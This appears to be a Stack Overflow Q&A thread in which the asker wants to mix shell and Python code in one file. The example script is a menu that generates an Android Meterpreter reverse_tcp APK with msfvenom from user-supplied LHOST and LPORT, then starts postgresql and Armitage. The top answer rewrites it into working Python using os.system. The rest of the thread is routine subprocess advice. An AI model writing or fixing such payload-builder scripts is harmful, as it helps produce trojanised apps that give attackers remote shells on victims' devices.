<div class="post-text" itemprop="text">
<p>I was wondering how can I combine sh and py code in one file and then execute it. What format should I save it in and commands for executing it?</p>
<p>Here is an example script I have written have a look at it and tell me the modifications to it</p>
<pre><code>#test

Print("hello welcome to test")

print("to exploit android enter 1")
print("to exploit windows enter 2")

user_response = input("&gt;")
if user_response == 1:
    print("you have seclected android")
    lhost = input("Please type in ur ip adress &gt; ")
    lport = input("Please type in ur recommended port to use &gt; ")
    print("the apk installable is placed on ur desktop")
    print("we are using reverse_tcp")
    print("the LHOST is",lhost)
    print("the LPORT is",lport)
    !msfvenom -p android/meterpreter/reverse_tcp LHOST=(how do i add lhost) LPORT=(how do i add lport) R&gt; /root/Desktop
    print("the apk is located in ur Desktop")
    !service postgresql start
    !armitage
elif user_response == 2:
    bla ..
    bla .. 
    bla ..
    testing bla bla bla
</code></pre>
</div>
<div class="post-text" itemprop="text">
<p>You can. You have to import the os module and wrap your shell commands like this: os.system("ls -l"). <a href="https://stackoverflow.com/questions/89228/calling-an-external-command-in-python">Source</a></p>
<p>So for your code it would look like this:</p>
<pre><code>#test

print("hello welcome to test")
import os
print("to exploit android enter 1")
print("to exploit windows enter 2")

user_response = input("&gt;")
if user_response == str(1):
    print("you have seclected android")
    lhost = input("Please type in ur ip adress &gt; ")
    lport = input("Please type in ur recommended port to use &gt; ")
    print("the apk installable is placed on ur desktop")
    print("we are using reverse_tcp")
    print("the LHOST is",lhost)
    print("the LPORT is",lport)
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + str(lhost) + " LPORT=" + str(lport) + " R&gt; /root/Desktop")
    print("the apk is located in ur Desktop")
    os.system("service postgresql start")
    os.system("armitage")
elif user_response == str(2):
    bla ..
    bla .. 
    bla ..
    testing bla bla bla
</code></pre>
<p>Linux does not care about filename extensions but it is still a python script so you should use .py. The command for executing it is "python3 scriptname.py". Keep in mind that you have to set the permission to executable with "chmod 755 scriptname.py"</p>
</div>
<div class="post-text" itemprop="text">
<p>You could save a Python file and run the shell script with Python code:</p>
<pre><code>import os
os.system('./script.sh')
</code></pre>
</div>
<div class="post-text" itemprop="text">
<p>You can't write both intermixed directly, but you can certainly run shell commands from within Python:</p>
<pre><code>import subprocess
retval = subprocess.call('echo foo', shell=True)
</code></pre>
<p>See the <a href="https://docs.python.org/3/library/subprocess.html" rel="nofollow"><code>subprocess</code> docs</a> for more detail. </p>
</div>
<span class="comment-copy">No, you cannot.</span>
<span class="comment-copy">You can easily execute shell command from python.</span>
<span class="comment-copy"><a href="http://stackoverflow.com/questions/12605498/how-to-use-subprocess-popen-python"><code>subprocess.popen()</code></a></span>
<span class="comment-copy">@123: Well, it should possible to have a unified script, but it's really not worth the efforts. That question would belong to <a href="https://codegolf.stackexchange.com">Programming Puzzles &amp; Code Golf</a> :D</span>
<span class="comment-copy">@123: <a href="http://stackoverflow.com/questions/38886505/how-to-write-a-bash-script-which-calls-itself-with-python">Here...</a> This is clever... :-)</span>
<span class="comment-copy">I have tried this program but doesn't work as it is supposed to, after I enter 1 the program ends</span>
<span class="comment-copy">sorry Nevermind the lines were not tabed</span>
<span class="comment-copy">I edited my code. It was comparing the input "1", which is a string, to the integer 1. By adding str() it's now comparing strings to strings. Please try again with these changes.</span>
<span class="comment-copy">i have tried that too. user = input("&gt;&gt;&gt;") user_response = int(user)</span>
